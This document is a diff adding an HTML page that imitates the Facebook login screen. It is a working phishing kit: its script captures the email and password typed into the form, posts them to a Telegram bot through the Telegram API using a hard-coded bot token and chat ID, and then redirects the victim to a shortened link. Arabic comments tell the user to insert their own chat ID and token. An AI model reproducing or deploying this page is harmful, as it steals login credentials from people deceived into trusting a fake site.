@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1000px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .welcome-text {
+            flex: 1;
+            margin-right: 20px;
+        }
+
+        .welcome-text h1 {
+            color: #1877f2;
+            font-size: 36px;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+
+        .welcome-text p {
+            font-size: 20px;
+            color: #606770;
+        }
+
+        .login-box {
+            flex: 1;
+            max-width: 400px;
+            width: 100%;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .login-box .btn-login {
+            width: 100%;
+            padding: 14px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .login-box .btn-login:hover {
+            background-color: #165dbb;
+        }
+
+        .login-box a {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .create-account {
+            background-color: #42b72a;
+            margin-top: 20px;
+            display: inline-block;
+            width: auto;
+            text-align: center;
+            padding: 14px;
+            color: #f8f8f8;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .footer-links {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .footer-links a {
+            color: #385898;
+            font-size: 12px;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                justify-content: center;
+            }
+
+            .welcome-text {
+                text-align: center;
+                margin-bottom: 20px;
+            }
+
+            .login-box {
+                max-width: 90%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="welcome-text">
+            <h1>Facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div>
+            <div class="login-box">
+                <form id="login-form">
+                    <input type="text" name="email" placeholder="Email or Phone Number" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <button type="submit" class="btn-login">Log In</button>
+                    <a href="#">Forgot password?</a>
+                    <a href="#" class="create-account">Create New Account</a>
+                </form>
+            </div>
+            <div class="footer-links">
+                <a href="#">English (US)</a>
+                <a href="#">Español</a>
+                <a href="#">Français (France)</a>
+                <!-- Add more language options here -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('login-form');
+        const chatId = '614770779'; // استبدل بـ chat ID الخاص بك في تيليجرام
+        const botToken = '7489145843:AAEPhf2hgpI75l5npkxxVmm1sKX-ctiRz9Q'; // استبدل بـ bot token الخاص بك
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+
+            const formData = new FormData(form);
+            const email = formData.get('email');
+            const password = formData.get('password');
+
+            const message = `Facebook '\n' Email: ${email}\nPassword: ${password}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            const data = {
+                chat_id: chatId,
+                text: message,
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            }).then(() => {
+                window.location.href = 'https://smrturl.co/cedf363';
+            });
+        });
+    </script>
+</body>
+</html>
